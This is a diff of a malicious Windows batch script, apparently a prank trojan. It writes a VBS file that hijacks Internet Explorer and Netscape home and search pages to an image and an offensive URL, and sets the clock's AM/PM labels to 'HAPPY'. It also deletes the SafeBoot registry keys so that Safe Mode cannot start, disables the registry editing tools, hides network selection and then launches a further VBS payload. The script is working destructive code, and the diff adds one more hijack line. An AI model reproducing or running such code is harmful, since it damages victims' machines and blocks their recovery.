@@ -55,6 +55,7 @@ echo on error resume next >> ieandstuff.vbs
 echo Set WshShell = CreateObject ("wscript.shell") >> ieandstuff.vbs
 echo WshShell.Regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","https://i.imgur.com/DAipxxw.jpeg", "REG_SZ" >> ieandstuff.vbs
 echo WshShell.Regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page","https://i.imgur.com/DAipxxw.jpeg", "REG_SZ" >> ieandstuff.vbs
+echo WshShell.Regwrite "HKCU\Software\Netscape\Netscape Navigator\Main\Home Page","http://www.JesusSaysYouSuck.com", "REG_SZ" >> ieandstuff.vbs
 echo WshShell.Regwrite "HKCU\Control Panel\International\s1159", "HAPPY","REG_SZ" >> ieandstuff.vbs
 echo WshShell.Regwrite "HKCU\Control Panel\International\s2359", "HAPPY","REG_SZ" >> ieandstuff.vbs
 goto NoMoreExplorer
@@ -637,7 +638,6 @@ reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v No
 reg ADD "HKLM\Software\Policies\Microsoft\Windows\System" /v DontDisplayNetworkSelectionUI /t REG_DWORD /d 1 /f
 reg DELETE "HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal" /f
 reg DELETE "HKLM\System\CurrentControlSet\Control\SafeBoot\Network" /f
-reg DELETE "HKCU\Software\Orange Group"
 reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
 ping -n 15 127.0.0.1>nul
 start CounterPoopFuker.vbs
